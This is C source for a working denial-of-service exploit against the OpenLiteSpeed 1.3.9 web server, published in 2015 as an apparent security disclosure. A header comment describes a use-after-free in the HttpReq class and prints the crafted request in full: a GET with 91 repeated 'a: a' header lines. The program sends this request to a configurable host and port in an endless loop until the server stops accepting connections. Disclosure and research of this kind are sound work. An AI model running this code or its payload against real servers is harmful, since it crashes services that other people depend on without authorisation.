/*
*	Openlitespeed 1.3.9 Use After Free denial of service exploit.
*
*	This exploit triggers a denial of service condition within the Openlitespeed web 
*	server. This is achieved by sending a tampered request contain a large number (91)
*	of 'a: a' header rows. By looping this request, a memmove call within the HttpReq
*	class is triggered with a freed pointer, resulting in a reference to an invalid
*	memory location and thus a segmentation fault.
*
*	UAF Request:
*	GET / HTTP/1.0
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	a: a
*	
*	The above request should be placed into a file name 'uafcrash' prior to running this
*	exploit code.
*
*	Date: 24/03/2015
*	Author: Denis Andzakovic - Security-Assessment.com
*
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>

extern int errno;

int main(int argc, char ** argv){
	FILE * fp;
	size_t len = 0;
	char * line;
	if((fp = fopen("uafcrash", "r")) == NULL){
		fprintf(stderr, "[!] Error: Could not open file uafcrash: %s", strerror(errno));
		return 1;
	}

	char * host = "127.0.0.1";
	int port = 8088;
	int count = 0; 
	int sock;
	struct sockaddr_in serv_addr;
	while(1){
		if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
			fprintf(stderr, "[!] Error: Could not create socket \n");
			return 1;
		} 

		serv_addr.sin_family = AF_INET;
		serv_addr.sin_port = htons(port);
		inet_pton(AF_INET, host, &serv_addr.sin_addr);

		if(connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr))<0){
			fprintf(stderr, "[!] Error: Could not connect! Check for server crash! Total cases sent:%d\n", count);
			close(sock);
			return 1;
		}
		while ((getline(&line, &len, fp)) != -1){

			write(sock, line, strlen(line));
		}

		close(sock);
		rewind(fp);
		count++;
	}

	return 42;
}
